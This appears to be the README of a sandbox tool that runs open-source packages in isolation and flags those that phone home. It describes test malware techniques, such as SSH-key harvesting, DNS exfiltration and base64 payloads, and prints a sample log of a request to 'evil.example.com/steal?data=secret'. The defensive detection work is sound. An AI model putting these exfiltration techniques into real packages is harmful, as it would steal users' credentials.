# pkgids: Behavioral Package Detonation Rig

pkgids is a dynamic malware detection tool for open-source packages. It downloads a package from PyPI or npm, detonates it inside a gVisor-isolated sandbox connected to a fake internet that captures all network behavior while blocking real egress, and flags packages that phone home or behave maliciously during installation or import. The key advantage over static source-code analysis tools is behavioral, network-level detection. pkgids catches obfuscated payloads that evade grep-based or AST-based scanning by actually executing them in a contained environment and watching what they do.

---

## Why I Built This

Open-source supply-chain attacks via malicious packages are a growing and underappreciated threat vector. Attackers publish packages with names similar to popular libraries (typosquatting), inject malicious versions of legitimate packages, or social-engineer maintainers into merging backdoors. The payload typically executes at install time (setup.py, package.json scripts) or at first import, before most users have any reason to be suspicious.

Static tools catch obvious red flags like use of subprocess, os.system, or known-bad URLs. But real malware consistently evades them through base64 encoding, multi-stage payloads, and dynamic URL construction. Behavioral analysis sidesteps all of that by running the package and watching what network connections it actually attempts.

One finding from building this: I queried 100 documented malicious PyPI packages from the OpenSSF malicious-packages dataset and every single one had already been removed from the registry by the time of the query. The registry take-down time is non-zero. A real-time, pre-installation behavioral detector is the only way to protect users who encounter a package before the registry reacts.

---

## Validated Results

pkgids was validated against a self-authored labeled corpus of 7 samples (6 distinct malicious techniques plus 1 benign control), each built as a local PyPI sdist and detonated through the full pipeline.

| Sample | Technique | Expected | Result |
|---|---|---|---|
| canary-http-install | urllib GET in setup.py | malicious | TP |
| canary-dns-exfil | base32-encoded subdomain DNS lookup | malicious | TP |
| canary-env-harvest | reads env + ~/.ssh/id_rsa length then GET | malicious | TP |
| canary-subprocess | spawns python3 -c "urlopen(...)" | malicious | TP |
| canary-base64-blob | exec(base64.b64decode(_BLOB)) leading to GET | malicious | TP |
| canary-import-callback | callback only in \_\_init\_\_.py | malicious | FN |
| benign-clean-control | does nothing | benign | TN |

**Detection rate: 83.3% (5/6). False-positive rate: 0%.**

The one false negative (canary-import-callback) is a known architectural limitation described in the Limitations section. Worth noting: the base64-obfuscated payload, the kind that defeats source scanners, was detected. That is the whole point of behavioral analysis.

> All corpus samples target canary-test.example.com (unreachable on the real internet) and cause no actual harm. They exist solely to measure detection capability.

---

## Architecture

See [architecture.md](architecture.md) for the full system diagram.

```
  fetch.py         dataset.py          validate.py
(download only)  (OpenSSF metadata)  (labeled corpus run)
      |
      v
+----------------------------------------------------------+
|  Contained detonation  (capture.py + sandbox.py)        |
|  gVisor runsc  internal network  no real egress         |
|                                                         |
|  +---------------------+    phones home    +----------+ |
|  |  Sandbox container  | ----------------> | Fake-inet| |
|  |  install -> import  |                   | appliance| |
|  |  non-root (deton)   |                   | DNS + TCP| |
|  |  resolv.conf->appl. |                   | JSONL log| |
|  +---------------------+                   +----------+ |
|  +---------------------+   +--------------------------+ |
|  |  tcpdump on bridge  |   |  Per-phase attribution   | |
|  |  capture.pcap       |   |  timestamp-window filter | |
|  +---------------------+   +--------------------------+ |
+----------------------------------------------------------+
      |
      v
+----------------------------------------------------------+
|  Verdict  (run.json)                                    |
|  network_activity -> malicious / benign                 |
|  83.3% detection  0% false-positive rate               |
+----------------------------------------------------------+
```

### Pipeline stages

1. **Fetch** - fetch.py downloads the package artifact from PyPI or npm, verifies the SHA-256 or SRI integrity digest, and writes a metadata.json (upload time, maintainers, file list, install-hook presence). Nothing is executed on the host.

2. **tcpdump** - capture.py determines the Linux bridge interface for detonet and starts tcpdump -w capture.pcap on it. Runs on the host, best-effort.

3. **Install phase** - sandbox.py calls docker run --runtime runsc with --network detonet, resource caps, and a custom resolv.conf pointing to the appliance. The sandbox runs pip3 install --break-system-packages --no-build-isolation --no-deps /work/<artifact> for PyPI or npm install for npm. Stdout, stderr, exit code, and duration are recorded to install.json.

4. **Import phase** - the same container runs python3 -c "import sys; sys.path.insert(0, '/scratch/site-packages'); import <module>" so the package installed in step 3 is available. Records to import.json.

5. **Stop tcpdump** - pcap file is flushed.

6. **Per-phase attribution** - each sandbox call is bracketed by time.time() snapshots forming a [t_start, t_end] window. _read_phase_entries() reads the appliance JSONL log and keeps only entries whose ts field falls within that window. Stale entries from IP recycling are excluded. This was the fix for a false-positive bug where a previous run's traffic was attributed to a benign package because Docker had recycled its detonet IP.

7. **Verdict** - run.json records exit codes, durations, per-phase network_activity booleans, and paths to all output files. Prediction rule: malicious if any phase has network_activity=True or the install phase timed out, benign otherwise.

---

## Safety and Containment

| Layer | Mechanism | Purpose |
|---|---|---|
| Kernel isolation | gVisor --runtime runsc | Intercepts syscalls before they reach the host kernel; a compromised package cannot exploit kernel CVEs |
| Network isolation | --network detonet (internal bridge) | Docker iptables rules drop all forwarded packets; no real internet is reachable |
| DNS spoofing | resolv.conf bind-mounted to point at appliance | Under gVisor, Docker's embedded resolver (127.0.0.11) does not function; mounting a custom file routes all DNS to the appliance |
| Fake internet | pkgids-fakeinternet appliance | Accepts connections and logs them instead of forwarding; the package believes it reached the internet |
| Non-root execution | --user deton inside container | Limits damage from container-escape attempts |
| Memory cap | --memory 1g | Prevents OOM attacks on the host |
| CPU cap | --cpus 1.0 | Prevents CPU exhaustion |
| PID limit | --pids-limit 256 | Prevents fork bombs |
| Wall-clock timeout | 120 s default (sandbox.timeout_secs) | Process is killed if exceeded; timed_out=true is recorded in results |
| Ephemeral containers | docker rm -f in finally block | Container is removed even on timeout or exception; no state persists |
| Read-only workdir | --mount type=bind,...,readonly | Artifact is visible inside the container but cannot be modified |
| Writable scratch | --mount type=tmpfs,target=/scratch | In-memory scratch space that evaporates on container exit |

---

## Components

| File | Role |
|---|---|
| pkgids/fetch.py | Downloads PyPI (prefers sdist, falls back to wheel) and npm (tarball) artifacts. Verifies SHA-256 (PyPI) or SRI sha512- hash (npm). Writes metadata.json with upload timestamp, maintainers, archive member list, and install-hook detection. Never executes anything. |
| pkgids/sandbox.py | Wraps docker run --runtime runsc. Manages the resolv.conf temp file (gVisor DNS fix), per-run unique container names, IP polling after startup to get the detonet IP before the container exits and Docker clears NetworkSettings, resource limits, and guaranteed cleanup via finally. |
| pkgids/capture.py | Pipeline orchestrator. Fetches or uses a local artifact, starts tcpdump, runs install and import phases, collects timestamp-windowed appliance logs, and writes install.json, import.json, network.jsonl, and run.json. |
| pkgids/validate.py | Reads a labeled CSV, runs capture.run() for each sample (skipping already-completed rows for resumability), computes TP/FP/TN/FN and detection and FP rates. Supports --local-artifacts for corpus validation from local sdists. |
| pkgids/dataset.py | Fetches malicious-package records from the OpenSSF malicious-packages repository via the GitHub Contents API. Returns ecosystem, name, version, osv_id, summary dicts. Results are cached to data/malicious_<ecosystem>.json. |
| pkgids/analyze.py | Cross-stream correlation engine. Detects file-before-exfil, shell-before-network, and subprocess payload patterns across strace telemetry and network logs. Writes correlations.json to the run directory. |
| pkgids/score.py | Additive 0–100 scoring model. 16 weighted indicators; +25 exfiltration combo bonus when credential access and HTTP/TLS both appear. Four-tier verdict: benign / suspicious / likely_malicious / malicious. |
| pkgids/report.py | Six-question HTML + JSON report: what happened, why the verdict, which phase, which host, which file, and how it differs from baseline. Writes behavior_profile.json and diff.json to the run directory alongside the report. |
| infra/fakeinternet/responder.py | Pure-stdlib Python. DNS server (UDP 53) that resolves every hostname to itself. TCP listeners on ports 21, 25, 80, 443, 8080. Extracts HTTP Host header and request line, TLS SNI, SMTP/FTP banners. Writes JSONL to /logs/<src_ip>.jsonl. |

---

## Usage

### Prerequisites

- Linux with Docker and gVisor (runsc runtime registered with Docker)
- Python 3.11+

### Install

```bash
git clone https://github.com/Yashcshah/pkgids.git
cd pkgids
python -m venv .venv && source .venv/bin/activate
pip install -e .
```

### Build the sandbox image

```bash
make sandbox-image
```

### Start the fake-internet appliance

```bash
make detonet
make fakeinternet-start
```

### Core commands

Download a package without running anything:
```bash
pkgids fetch pypi requests 2.31.0
pkgids fetch npm lodash 4.17.21
```

Detonate a package through the full pipeline:
```bash
pkgids detonate pypi requests 2.31.0
pkgids detonate npm lodash 4.17.21 --skip-import
pkgids detonate pypi six 1.16.0 --run-dir /tmp/six-run
```

Output is written to runs/<timestamp>-<ecosystem>-<name>-<version>/ as run.json.

Browse the OpenSSF malicious-packages dataset without executing anything:
```bash
pkgids dataset fetch pypi --limit 20
pkgids dataset fetch npm --limit 50 --token $GITHUB_TOKEN
```

Validate against a labeled CSV:
```bash
# Against live registry packages:
pkgids validate --samples data/benign_samples.csv

# Against locally-built corpus sdists (corpus/ must be built separately — see Corpus section):
pkgids validate --samples data/corpus_samples.csv --local-artifacts
```

Validation is resumable. Samples already in data/validation_results.json are skipped on re-run.

### Demo: confirm fake-internet capture works

```bash
make demo-fake
```

Runs a DNS and HTTP canary, prints the capture log, and confirms no real egress occurred.

---

## Output Files

Each pkgids detonate run creates a directory under runs/:

```
runs/20240621T120000Z-pypi-six-1.16.0/
  install.json     # command, stdout, stderr, exit_code, duration, window [t0,t1]
  import.json      # same for import phase
  network.jsonl    # timestamp-filtered fakeinternet entries for this run only
  capture.pcap     # tcpdump on detonet bridge (requires host root; skipped if unavailable)
  run.json         # summary: phases, network_activity per phase, paths to all outputs
```

network.jsonl entries look like:
```json
{"ts": 1719000001.23, "type": "dns",  "src": "10.200.200.3", "query": "evil.example.com", "resolved_to": "10.200.200.2"}
{"ts": 1719000001.31, "type": "tcp",  "src": "10.200.200.3", "dst_port": 80, "protocol": "http", "host": "evil.example.com", "request_line": "GET /steal?data=secret HTTP/1.1"}
```

---

## Configuration

All knobs live in config.toml:

```toml
[sandbox]
image        = "pkgids-sandbox:latest"
runtime      = "runsc"          # set to "runc" to disable on machines without gVisor
timeout_secs = 120
memory       = "1g"
cpus         = 1.0
pids_limit   = 256

[fakeinternet]
network        = "detonet"
subnet         = "10.200.200.0/24"
container_name = "pkgids-fakeinternet"
ip             = "10.200.200.2"
logs_dir       = "logs/fakeinternet"

[detonation]
runs_dir            = "runs"
skip_import         = false
clear_logs_each_run = true
```

---

## Supabase Setup (Optional — remote persistence only)

pkgids generates all run artifacts locally without Supabase. Every detonation writes `run.json`, `network.jsonl`, `telemetry.jsonl`, `behavior_profile.json`, `correlations.json`, and (when a diff is provided) `diff.json` to the run directory. None of this requires a database.

Supabase is only required for the remote persistence commands:

| Command | What it does |
|---|---|
| `pkgids baseline push` | Stores a behavior profile in the cloud |
| `pkgids baseline list / show` | Queries stored profiles |
| `pkgids diff --push` | Persists a diff result |
| `pkgids report` (auto-diff) | Fetches stored profiles to compute a diff; skipped with a warning if unavailable |

### Schema

The complete schema lives in two files that must be run in order:

```
migrations/001_baseline_schema.sql   — packages, behavior_profiles, behavior_diffs tables
migrations/002_add_risk_delta.sql    — adds risk_delta column to behavior_diffs
```

To apply them: open the Supabase dashboard for your project → SQL Editor → New Query → paste and run each file in order.

Three tables are created:

| Table | Purpose | Key constraint |
|---|---|---|
| `packages` | One row per (ecosystem, name, version) | `UNIQUE (ecosystem, name, version)` |
| `behavior_profiles` | One row per detonation run | FK → `packages.id` |
| `behavior_diffs` | One row per compared version pair | `UNIQUE (ecosystem, name, from_version, to_version)`; FK → `behavior_profiles.id` (nullable) |

Row Level Security is enabled on all three tables with open policies (`FOR ALL TO anon, authenticated`). Tighten these before exposing the project publicly.

### Environment variables

```bash
# Required for any remote persistence command.
# Add to a .env file in the project root (loaded automatically).
SUPABASE_URL=https://<project-ref>.supabase.co
SUPABASE_KEY=<anon-or-service-role-key>
```

Alternatively, if you share a Supabase project with a frontend app:

```bash
NEXT_PUBLIC_SUPABASE_URL=https://<project-ref>.supabase.co
NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY=<publishable-key>
```

`SUPABASE_URL`/`SUPABASE_KEY` take priority over the `NEXT_PUBLIC_` variants when both are set.

### Behavior when Supabase is not configured

Any remote persistence command exits with:

```
error: Supabase credentials missing.
Set SUPABASE_URL + SUPABASE_KEY in .env or as environment variables.
Schema: run migrations/001_baseline_schema.sql then migrations/002_add_risk_delta.sql
in the Supabase SQL editor.
See the 'Supabase Setup' section in README.md for full instructions.
```

`pkgids detonate` and `pkgids report` are unaffected — they write local artifacts only.

---

## Corpus

corpus/ contains seven self-authored sample packages. Each is a buildable PyPI sdist demonstrating one malware technique. All targets point to canary-test.example.com, a fake sink that is unreachable on the real internet.

The `corpus/` directory and `build_all.sh` script are not included in the repository. To build the corpus sdists, recreate each package directory from the descriptions in `data/corpus_samples.csv`, then run `python setup.py sdist` in each and update the `artifact_path` column to point at the resulting `.tar.gz` files. The `data/corpus_samples.csv` file lists the expected artifact paths under `/root/pkgids/corpus/dist/`.

Once sdists are available, run validation with:

```bash
pkgids validate --local-artifacts data/corpus_samples.csv
```

---

## Limitations and Future Work

**Import-time callbacks — architecture fixed, corpus rerun pending.** canary-import-callback puts its payload in `__init__.py`. The single-container approach (install writes to `/scratch/site-packages`, import prepends that to `sys.path`) means the import phase can now find and execute what install placed. This should close the previous false negative. The corpus has not been re-detonated to confirm; run `pkgids validate --local-artifacts data/corpus_samples.csv` once corpus sdists are built to verify.

**Supported ecosystems.** Deep support exists for PyPI (sdist/wheel preference, SHA-256 integrity, metadata.json) and npm. Other ecosystems such as RubyGems, crates.io, and Maven are not supported.

**Simple prediction rule.** The current heuristic is: network_activity=True means malicious, install timeout means malicious, otherwise benign. The additive scoring model in score.py refines this into four tiers, but the primary detection signal is still behavioral (network + process activity). No Zeek-based protocol analysis or static feature extraction beyond the archive member list.

**No live feed.** The tool is driven by explicit pkgids detonate or pkgids validate calls. Integration with a real-time package-publication feed such as PyPI RSS or BigQuery events is not implemented.

**tcpdump requires host root.** The pcap capture uses tcpdump on the host bridge interface. This is skipped with a warning if the host user lacks the necessary capability. The JSONL appliance log is always written regardless.

**gVisor must be installed.** The sandbox requires --runtime runsc. On machines without gVisor, set runtime = "runc" in config.toml. This removes kernel-level isolation but preserves all other containment layers.

---

## Responsible Use

Do not detonate packages outside the contained rig. The appliance and internal network ensure no real internet calls are made, but this guarantee depends on Docker and gVisor being correctly configured.

Do not redistribute malicious artifacts. The artifacts/, runs/, and corpus/dist/ directories are gitignored because they may contain malicious code.

The corpus samples are safety-research packages. They target a non-existent domain and cause no harm, but they execute real network code and should be treated accordingly.

---

## Running Tests

```bash
pytest -v
```

641 unit tests pass without Docker. 17 Docker-dependent tests are automatically skipped when the environment is not configured.
